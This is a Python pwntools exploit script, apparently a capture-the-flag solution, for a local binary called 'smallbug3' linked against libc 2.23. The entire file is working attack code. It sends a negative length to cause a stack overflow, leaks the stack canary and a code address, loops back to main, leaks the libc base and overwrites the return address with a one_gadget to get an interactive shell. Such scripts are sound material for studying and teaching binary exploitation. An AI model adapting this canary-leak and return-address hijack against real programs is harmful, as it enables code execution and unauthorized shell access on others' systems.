from pwn import *

context.log_level = 'debug'

p = process("./smallbug3")
elf = ELF("libc-2.23.so")
one_gadget = 0x45216
sys_offset = elf.symbols['system']

print "sys_offset:",hex(sys_offset)

if __name__=='__main__':

	p.recvuntil("Input the length of your name:")
	p.sendline(str(-1))
	#gdb.attach(p)
	p.recvuntil("Input your name:")
	payload = 'a'*0x85 + 'b'*0x4
	p.send(payload)
	p.recvuntil("bbbb")
	canary = u64('\x00' + p.recv(7))
	print "canary:",hex(canary)
	ebp = u64(p.recv(6).ljust(8,'\0'))
	base = ebp - 0xad0
	print "base:",hex(base)
#	gdb.attach(p)
	p.recvuntil("Leave some message for us:")

	main_addr = base + 0x9cc
	payload = 'a'*0x88 + p64(canary) + 'a'*0x8 + p64(main_addr)
	p.send(payload)
#--------------------------------second
	p.recvuntil("Input the length of your name:")
	p.sendline(str(-1))
#	gdb.attach(p)
	p.recvuntil("Input your name:")
	payload = 'a'*(0x120-0x4)+'b'*0x4
	p.send(payload)
	p.recvuntil('b'*0x4)
	libc_base = u64(p.recv(6).ljust(8,'\0'))-0x3da7cb
	print "libc_base:",hex(libc_base)
	one_gadget = one_gadget + libc_base
	p.recvuntil("Leave some message for us:")
	payload = 'a'*0x88 + p64(canary) + 'a'*0x8 + p64(one_gadget)
	p.send(payload)

	p.interactive()
